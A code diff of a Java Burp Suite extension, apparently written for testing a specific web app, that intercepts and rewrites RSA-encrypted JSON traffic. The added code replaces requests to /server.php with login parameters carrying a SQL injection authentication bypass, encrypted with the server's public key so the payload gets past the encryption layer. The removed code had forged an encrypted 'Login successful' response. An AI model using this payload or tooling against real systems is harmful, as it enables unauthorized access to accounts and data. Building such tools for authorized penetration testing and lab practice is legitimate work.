@@ -3,11 +3,8 @@ import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.http.handler.*;
 import burp.api.montoya.logging.Logging;
 import javax.crypto.Cipher;
-import java.net.URLDecoder;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 import java.security.KeyFactory;
 import java.security.PrivateKey;
 import java.security.PublicKey;
@@ -120,12 +117,36 @@ public class BurpCypher implements BurpExtension, HttpHandler {
 
     @Override
     public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
+        if (requestToBeSent.path().equals("/server.php")){
+            String params = "action=login&username=' or '1'='1'-- -&password=' or '1'='1'-- -";
+
+            // Plaintext -> bytes
+            byte[] plaintext = params.getBytes(StandardCharsets.UTF_8);
+
+            try {
+                // Encrypt with server's public key
+                byte[] encryptedBytes = encryptRSA(plaintext, serverPublicKey);
+                // RSA ciphertext -> Base64 string
+                String encryptedData = Base64.getEncoder().encodeToString(encryptedBytes);
+                // Create JSON
+                ObjectMapper mapper = new ObjectMapper();
+                ObjectNode json = mapper.createObjectNode();
+                json.put("data", encryptedData);
+
+                String requestJson = mapper.writeValueAsString(json);
+
+                // Replace HTTP response body
+                return RequestToBeSentAction.continueWith(requestToBeSent.withBody(requestJson));
+            } catch (Exception e) {
+                logging.logToError("Request SQL Injection creation failed: " + e.getMessage());
+            }
+        }
+        
         String requestBody = requestToBeSent.body().toString();
         try{
             ObjectMapper mapper = new ObjectMapper();
             JsonNode json = mapper.readTree(requestBody);
             String data = json.path("data").asText("");
-            logging.logToOutput("Data: " + requestBody);
             if (!data.isEmpty()) {
                 try {
                     byte[] encryptedData = Base64.getDecoder().decode(data);
@@ -178,28 +199,7 @@ public class BurpCypher implements BurpExtension, HttpHandler {
             e.printStackTrace();
         }
 
-        String responseText = "Login successful";
-
-        // Plaintext -> bytes
-        byte[] plaintext = responseText.getBytes(StandardCharsets.UTF_8);
-
-        try {
-            // Encrypt with client's public key
-            byte[] encryptedBytes = encryptRSA(plaintext, clientPublicKey);
-            // RSA ciphertext -> Base64 string
-            String encryptedData = Base64.getEncoder().encodeToString(encryptedBytes);
-            // Create JSON
-            ObjectMapper mapper = new ObjectMapper();
-            ObjectNode json = mapper.createObjectNode();
-            json.put("data", encryptedData);
-
-            String responseJson = mapper.writeValueAsString(json);
-
-            // Replace HTTP response body
-            return ResponseReceivedAction.continueWith(responseReceived.withBody(responseJson));
-        } catch (Exception e) {
-            logging.logToError("Response creation failed: " + e.getMessage());
-        }
+        
         return ResponseReceivedAction.continueWith(responseReceived);
     }
 
